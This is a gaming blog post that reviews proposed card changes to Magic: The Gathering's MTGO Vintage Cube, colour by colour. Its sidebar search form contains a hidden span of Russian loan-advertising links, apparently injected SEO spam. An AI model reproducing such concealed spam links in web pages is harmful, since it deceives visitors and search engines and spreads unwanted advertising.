+<p>Grim Tutor often fills the role of begrudgingly playable since none of the cheaper tutors showed up, making Sidisi, Undead Vizier look horrible in comparison.  Often Sidisi, Undead Vizier gets played as a worse version of Diabolic Tutor, so it definitely seems out of place.  The only saving grace is something like a ramp deck that uses Sidisi’s Exploit ability to sacrifice a mana dork.  It won’t take much persuasion for me to ditch this expensive tutor for a better card.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/LilianaDeathsMajesty.jpg"><img class="alignnone size-medium wp-image-1967" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/LilianaDeathsMajesty-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/LilianaDeathsMajesty-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/LilianaDeathsMajesty.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
+<p>I think this card might be strong enough to stay, but the jury is still out.  If most of the reanimator decks end up turboing out a giant creature as fast as possible, Liliana, Death’s Majesty is worse than a four mana option.  If value reanimator decks occasionally show up, Liliana, Death’s Majesty seems much better than something like Diabolic Servitude.  The versatility means that Liliana will keep her spot for now, but I can imagine cutting it for something else soon.</p>
+<p>&nbsp;</p>
+<h2>Red</h2>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Jackle-to-Noble.jpg"><img class="alignnone size-medium wp-image-1965" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Jackle-to-Noble-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Jackle-to-Noble-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Jackle-to-Noble.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>There isn’t a lot to say about this one.  My playgroup prefers Stromkirk noble to Jackal Pup, and the power levels of the cards are pretty close to even.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Stormbreath-to-Fiend.jpg"><img class="alignnone size-medium wp-image-1986" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Stormbreath-to-Fiend-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Stormbreath-to-Fiend-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Stormbreath-to-Fiend.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>I made this change for curve reasons.  The Vintage Cube has six different five drops in red, and that just felt like way too many.  It still feels high, but I’m going to wait and see for a little while before making further changes.  Torch Fiend is a solid two drop that I was sad to lose from the last iteration of the Vintage Cube, so I brought it back.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Chandra-to-Gargadon.jpg"><img class="alignnone size-medium wp-image-1994" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Chandra-to-Gargadon-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Chandra-to-Gargadon-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Chandra-to-Gargadon.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Red has a bunch of noncreature four drops, and most of them have power levels high enough to justify the glut.  Chandra, Pyromaster sticks out like a sore thumb, particularly when compared to Chandra, Torch of Defiance.  The weaker Candra will sit on the sidelines to thin out the four drop section. As for Greater Gargadon, Wildfire decks are fairly popular with my group. The suspend monster fits in well there, so I slotted it in. I wanted to be sure to avoid another card that just went into an aggressive deck, since I recognize my bias there.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rift-to-Rabblemaster.jpg"><img class="alignnone size-medium wp-image-1978" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rift-to-Rabblemaster-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rift-to-Rabblemaster-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rift-to-Rabblemaster.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>The Vintage Cube has a fairly heavy dedication to red burn spells, clearly encouraging direct damage over creatures.  The inclusions of Exquisite Firecraft, Rift Bolt, and three Incinerate variants take up several slots usually devoted to creatures.  Rift Bolt’s Suspend makes it clunkier than the other burn spells, so I’m treating it as a three drop.  Goblin Rabblemaster is a great threat in the same aggressive red decks, while still being a serviceable finisher in anything more controlling.  I’m perfectly fine cutting down on a few of the burn spells to make room for Goblin Rabblemaster.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Dualcaster-to-Feldon.jpg"><img class="alignnone size-medium wp-image-1960" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Dualcaster-to-Feldon-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Dualcaster-to-Feldon-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Dualcaster-to-Feldon.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>I think I’ve only seen a few noteworthy shenanigans with Dualcaster Mage, no matter how often it gets crammed into various MTGO cubes.  Feldon of the Third Path is pretty mana intensive, but it&#8217;s another card that can foster non-aggressive red decks.  If it doesn’t find enough homes, it will probably get changed for something like Hanweir Garrison.</p>
+<p>&nbsp;</p>
+<h3>Red &#8211; On Notice</h3>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SwelteringSuns.jpg"><img class="alignnone size-medium wp-image-1988" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SwelteringSuns-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SwelteringSuns-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SwelteringSuns.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
+<p>I’m not positive if red needs a Pyroclasm effect, but I suppose this is the best option if it does.  The exile effect of Anger of the Gods isn’t useful in cube, and Cycle 3 is a fine bonus.  Actual Pyroclasm might end up being better due to the cheaper cost, but I’ll start with Sweltering Suns for now.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Commander-and-Dwellers.jpg"><img class="alignnone size-medium wp-image-1952" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Commander-and-Dwellers-300x209.jpg" alt="" width="300" height="209" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Commander-and-Dwellers-300x209.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Commander-and-Dwellers.jpg 446w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>As I mentioned with Stormbreath Dragon, this iteration of the Vintage Cube has six different 5 drop red creatures.  I expect at least one of these should probably still be cut, possibly both.  I started with Stormbreath Dragon since Thundermaw Hellkite is a very similar card. I would rather shave finishers and leave some cards that can encourage creative deckbuilding. If Siege-Gang Commander or Goblin Dark-Dwellers don&#8217;t find enough homes, they are among my first choices to cut for new additions.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ExquisiteFirecraft.jpg"><img class="alignnone size-medium wp-image-1962" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ExquisiteFirecraft-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ExquisiteFirecraft-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ExquisiteFirecraft.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
+<p>This cube is actually pretty low on counterspells, so I’m not sure if Exquisite Firecraft really has a home.  It is one of a large number of burn spells I mentioned when discussing Rift Bolt, and I won’t be surprised if it gets cut eventually.</p>
+<p>&nbsp;</p>
+<h2>Green</h2>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Traverse-to-Plow.jpg"><img class="alignnone size-medium wp-image-1990" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Traverse-to-Plow-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Traverse-to-Plow-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Traverse-to-Plow.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>This was a pretty easy swap for me.  Traverse the Ulvenwald has underperformed every time I’ve see it played, as Delirium is incredibly hard to turn on in Cube.  Plow Under is beloved by a few of my fellow cube players, so I already knew I needed to find room for it.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Protector-to-Tracker.jpg"><img class="alignnone size-medium wp-image-1974" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Protector-to-Tracker-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Protector-to-Tracker-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Protector-to-Tracker.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>This is mostly a swap in how green gains card advantage.  Den Protector likely gets a better card, but I think I’d prefer to remove the Morph/Megamorph cards from the cube altogether.  Losing Den Protector reduces the number of shenanigans for huge bombs like Time Walk, but Tireless Tracker can help find those cards in the first place.  This is pretty close to an even exchange on power level, and I’d prefer Den Protector to be out.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Deliverance-to-Naturalists.jpg"><img class="alignnone size-medium wp-image-1955" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Deliverance-to-Naturalists-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Deliverance-to-Naturalists-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Deliverance-to-Naturalists.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>The current Vintage Cube cut Conclave Naturalists for Dissenter’s Deliverance, and I wanted to change it back.  They are both fine cards, but several people in my playgroup enjoy shenanigans with Living Death and Survival of the Fittest. I figured the change back wasn’t a huge power level hit and having the ability on a creature would be a bonus.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rishkar-to-Ramunap.jpg"><img class="alignnone size-medium wp-image-1979" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rishkar-to-Ramunap-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rishkar-to-Ramunap-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rishkar-to-Ramunap.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Rishkar, Peema Renegade is a pretty good card in Legacy Cube.  Green has more of a monopoly on ramp there, and Rishkar, Peema Renegade has some good targets for the second counter.  In Vintage Cube, I think his stock plummets.  Most targets for the counter on the first few turns will already be able to generate mana, so Rishkar, Peema Renegade is essentially a 3/3 Llanowar Elf for three.  With an abundance of mana rocks, I want to do better than that. I was less sure of what I wanted to replace him with, and I eventually settled on Ramunap Excavator.  Crucible of Worlds is a popular cube card, so I figured a second variation was worth a shot.</p>
+<p>&nbsp;</p>
+<h3>Green &#8211; On Notice</h3>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/RamunapExcavator.jpg"><img class="alignnone size-medium wp-image-1976" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/RamunapExcavator-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/RamunapExcavator-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/RamunapExcavator.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
+<p>I haven’t gotten to see Ramunap Excavator in cube yet, so I don’t know if it is a good fit.  Being a creature makes it almost always worse, but I don’t think it will be by a huge margin.  Wildfire decks can’t utilize Ramunap Excavator well, but any sort of Armageddon, Strip Mine, or fetch land shenanigans still work just fine.  Being green instead of an artifact might be a bigger problem.  It loses the synergy with Metalworker, and green isn’t the best color to take advantage of all the decks interested in nuking lands.  I still think Ramunap Excavator is worth testing, but I can imagine a world with it underperforming and getting replaced.</p>
+</address>
+<p>&nbsp;</p>
+<h2>Azorius</h2>
+<address>
+<h2><img class="alignnone wp-image-1951" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Azorius-207x300.jpg" alt="" width="102" height="148" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Azorius-207x300.jpg 207w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Azorius.jpg 323w" sizes="(max-width: 102px) 100vw, 102px" /></h2>
+<p>More than any other color, there are a ton of cards I want to fit into the Azorious section of my cube.  These are all fine options, and this is the only choice I’m still unsure about.  Spell Queller and Narset Transcendant are the potential additions, along with the five cards currently in the Vintage Cube.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/DragonlordOjutai.jpg"><img class="alignnone size-medium wp-image-1959" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/DragonlordOjutai-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/DragonlordOjutai-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/DragonlordOjutai.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
+<p>This is a great finisher.  It’s relatively cheap compared with most other options, protects itself, and generates card advantage with selection.  Dragonlord Ojutai is one of the best win conditions available for control and a clear pull into white and blue.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/GeistOfSaintTraft.jpg"><img class="alignnone size-medium wp-image-1963" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/GeistOfSaintTraft-216x300.jpg" alt="" width="216" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/GeistOfSaintTraft-216x300.jpg 216w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/GeistOfSaintTraft.jpg 223w" sizes="(max-width: 216px) 100vw, 216px" /></a></p>
+<p>There is a pretty big swath of decks that Geist of Saint Traft is bad against, but it is a complete beating against anything that doesn’t play to the board.  This is a proactive answer to combo and control decks. The problem I have with Geist is that it plays like a sideboard card. I&#8217;ve expressed my dislike of dedicated sideboard cards already, and I&#8217;m unsure of how often this card will actually make it into decks.</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/NarsetTranscendent.jpg"><img class="alignnone size-medium wp-image-1969" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/NarsetTranscendent-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/NarsetTranscendent-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/NarsetTranscendent.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a><br />
+I’m not going to lie, Narset Transcendent is a pet card of mine.  I imagine it won’t make the cut, but narrowing down the other six cards is hard enough that I tossed Narset Transcendent into the mix in case enough other cards get cut.  I’m still waiting to see Plow Under with Narset, and that adds to my reluctance to cut it.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ReflectorMage.jpg"><img class="alignnone size-medium wp-image-1977" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ReflectorMage-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ReflectorMage-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ReflectorMage.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
+<p>Reflector Mage does a good job of controlling the battlefield in the early turns, along with providing a solid answer for Reanimator decks.  If I cut Reflector Mage, I expect I’d want to put a different bounce creature into the blue section. It&#8217;s not a strong pull into blue and white, but it synergies well with several cards and has enough raw power to make most decks that can play it.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SpellQueller.jpg"><img class="alignnone size-medium wp-image-1984" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SpellQueller-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SpellQueller-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SpellQueller.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
+<p>A fragile counterspell that provides a clock, Spell Queller will be a nightmare for some combo decks.  If they don’t have removal, it locks spells in exile permanently.  Yawgmoth’s Will, Magus of the Will, Regrowth, and Eternal Witness come to mind as reasons that Spell Queller can be better than a regular counterspell.  There are the obvious problems if Spell Queller dies, but interaction is less prevalent in Vintage Cube.  Even in interactive formats, Spell Queller has seen some play in Standard and Modern. I expect this would be a great addition.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SphinxsRevelation.jpg"><img class="alignnone size-medium wp-image-1985" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SphinxsRevelation-216x300.jpg" alt="" width="216" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SphinxsRevelation-216x300.jpg 216w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SphinxsRevelation.jpg 223w" sizes="(max-width: 216px) 100vw, 216px" /></a></p>
+<p>Drawing cards is great.  Gaining enough life to cast those cards without dying is also great.  This is a great reason to go into blue and white.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SupremeVerdict.jpg"><img class="alignnone size-medium wp-image-1987" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SupremeVerdict-216x300.jpg" alt="" width="216" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SupremeVerdict-216x300.jpg 216w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SupremeVerdict.jpg 223w" sizes="(max-width: 216px) 100vw, 216px" /></a></p>
+<p>One of the better Wrath of God variants in the cube, Supreme Verdict is somehow one of the cards I’m least sure about keeping.   There are several wrath options already available in cube, and Supreme Verdict is only marginally better than other options.</p>
+<p>&nbsp;</p>
+<p>I’ve currently selected Dragonlord Ojutai, Geist of Saint Traft, Reflector Mage, Spell Queller, and Sphinx’s Revelation, cutting Narset Transcendant and Supreme Verdict.  Geist of Saint Traft is tentatively in, but I’ll want to see how it plays for a while.  If enough decks aren’t using it, I’m planning to switch it for Supreme Verdict.</p>
+<p>&nbsp;</p>
+<h2>Selesnya</h2>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Selesnya.jpg"><img class="alignnone wp-image-1980" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Selesnya.jpg" alt="" width="103" height="147" /></a></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Voice-to-Teeg.jpg"><img class="alignnone size-medium wp-image-1991" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Voice-to-Teeg-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Voice-to-Teeg-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Voice-to-Teeg.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Voice of Resurgance serves mostly as a beater that discourages counterspells and other instants.  It is incredibly color restrictive and works best if it comes down early.  Gaddock Teeg hits a slightly different swath of cards, but it is less disastrous if it comes down a turn or two later.  Green and white don’t necessarily work together well as a two color deck, so I’m opting for the card that I’m happier with as a light splash.</p>
+</address>
+<p>&nbsp;</p>
+<h2>Dimir</h2>
+<address><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Dimir.jpg"><img class="alignnone wp-image-1957" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Dimir.jpg" alt="" width="98" height="140" /></a></p>
+<h3>On Notice</h3>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ShadowmageInfiltrator.jpg"><img class="alignnone size-medium wp-image-1981" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ShadowmageInfiltrator-216x300.jpg" alt="" width="216" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ShadowmageInfiltrator-216x300.jpg 216w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ShadowmageInfiltrator.jpg 223w" sizes="(max-width: 216px) 100vw, 216px" /></a></p>
+<p>Time has mostly passed by Jonny Magic’s invitational card.  I’m really just waiting for a card good enough to justify cutting Shadowmage Infiltrator.</p>
+</address>
+<p>&nbsp;</p>
+<h2>Rakdos</h2>
+<address><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rakdos.jpg"><img class="alignnone wp-image-1975" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Rakdos.jpg" alt="" width="102" height="146" /></a></p>
+<h3>On Notice</h3>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/OliviaVoldaren.jpg"><img class="alignnone size-medium wp-image-1973" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/OliviaVoldaren-216x300.jpg" alt="" width="216" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/OliviaVoldaren-216x300.jpg 216w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/OliviaVoldaren.jpg 223w" sizes="(max-width: 216px) 100vw, 216px" /></a></p>
+<p>There are tons of cards that I like to consider in the Rakdos section, but several of them lose their potency if black isn’t an aggressive color.  Blightning and Falkenrath Aristocrat are suboptimal, and Rakdos Cackler might as well be in the red section.  Bituminous Blast is another card I like, but the raw power of Olivia Voldaren probably means she deserves her spot.  I could imagine Blightning or Rakdos Cackler making their way in if she doesn’t find enough homes.</p>
+</address>
+<p>&nbsp;</p>
+<h2>Colorless</h2>
+<address><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Disk-to-Bonesplitter.jpg"><img class="alignnone size-medium wp-image-1958" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Disk-to-Bonesplitter-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Disk-to-Bonesplitter-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Disk-to-Bonesplitter.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a>I can’t remember the last time I actually saw someone pop a Nevinyrral’s Disk.  It’s slow and this cube is filled with artifact destruction already.  I cut it for Bonesplitter, which is a replacement level card for white and red aggressive decks.  I’d prefer Grafted Wargear, but the cycle of Swords means there is a glut of three cost equipment already.  I expect this to still be one of the first cards I cut if another good colorless card gets printed.&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Nykthos-to-Barrens.jpg"><img class="alignnone size-medium wp-image-1972" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Nykthos-to-Barrens-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Nykthos-to-Barrens-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Nykthos-to-Barrens.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Abbey-to-Wilds.jpg"><img class="alignnone size-medium wp-image-1949" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Abbey-to-Wilds-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Abbey-to-Wilds-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Abbey-to-Wilds.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Both of these colorless lands don’t seem to have enough support to warrant their inclusion.  Green seems like the only color that can make use of Nykthos, Shrine of Nyx, and those decks can probably produce enough mana already if Nykthos would net mana.  Westvale Abbey just doesn’t seem to have enough support.  I cut both of them for additional lands that can fix for any color.  Ash Barrens might be better as Terramorphic Expanse, but I’d rather have two different effects than the same card twice.</p>
+<p>&nbsp;</p>
+<h2>Wrapping Up</h2>
+<p>This is the cube I intend to assemble.  I’ve got stacks of cards sitting around my computer, just waiting for me to make a few personal decisions.  I’m still trying to decide what my budget is for foiling cards out and whether or not I’m going to break up playsets of my Modern and Legacy staples.  I’m also not sure what I’m doing about power and other expensive cards I’ve decided to include.  Even if I were to assemble that much valuable cardboard, I’m not prepared to expose it to my friends and alcohol.  It’ll probably take me a few more weeks to hammer out those details.</p>
+<p>I would love to hear opinions on my changes or changes you think should be made.  I believe that, with the possible exception of Plow Under, each of the cards I decided to change is an increase in power level.  I expect there will be more changes I want to make, but I like this as a starting point.</p>
+</address>
+
+</section><!-- /.article-content -->
+					<aside class="post-meta">
+			<ul>
+				<li class="categories"><a href="http://www.wizardscupboard.com/wordpress/category/edh-commander/" rel="category tag">EDH/Commander</a></li>
+				<li class="comment"><a href="http://www.wizardscupboard.com/wordpress/modifying-the-mtgo-vintage-cube/#respond">0 Comments</a></li>
+													<li class="author"><a href="http://www.wizardscupboard.com/wordpress/author/wizard5/" title="Posts by The Wizard" rel="author">The Wizard</a></li>
+							</ul>
+		</aside><!-- /.post-meta -->
+		
+		</article><!-- #post-1992 -->
+
+	
+			<nav role="navigation" id="" class="navigation-post">
+			<h1 class="screen-reader-text">Post navigation</h1>
+
+		
+			<div class="nav-previous"><a href="http://www.wizardscupboard.com/wordpress/an-overview-and-my-experiences-with-1v1-commander/" rel="prev"><span class="meta-nav"></span> An Overview and My Experiences with 1v1 Commander</a></div>			<div class="nav-next"><a href="http://www.wizardscupboard.com/wordpress/one-week-into-ixalan-standard/" rel="next">One Week into Ixalan Standard <span class="meta-nav"></span></a></div>
+		
+		</nav><!-- # -->
+		
+
+
+<div id="comments" class="comments">
+
+	
+	
+		<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/wordpress/modifying-the-mtgo-vintage-cube/#respond" style="display:none;">Cancel reply</a></small></h3>			<form action="http://www.wizardscupboard.com/wordpress/wp-comments-post.php" method="post" id="commentform" class="comment-form">
+				<p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea></p><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" aria-required='true' required='required' /></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" aria-required='true' required='required' /></p>
+<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="text" value="" size="30" maxlength="200" /></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='1992' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="4024cae669" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="91"/></p>			</form>
+			</div><!-- #respond -->
+	
+</div><!-- .comments -->
+
+
+</section><!-- /.content -->
+
+
+
+
+<aside class="sidebar" role="complementary">
+
+	
+	<aside id="search-2" class="widget widget_search">	<form method="get" id="searchform" class="searchform" action="http://www.wizardscupboard.com/wordpress/" role="search">
+		<label for="s" class="screen-reader-text">Search</label>
+		<input type="search" class="field" name="s" value="" id="s" placeholder="Search &hellip;" />
+		<input type="submit" class="submit" id="searchsubmit" value="Search" /><span style="dispLAy : NOnE;"><a href="http://www.tttgoogle.ru">кредит онлайн заявка</a><a href="http://www.tttgoogle.ru/zaymyi.html">срочный кредит</a><a href="http://www.tttgoogle.ru/business-kredit.html">кредит бизнесу1</a></span>
+	</form>
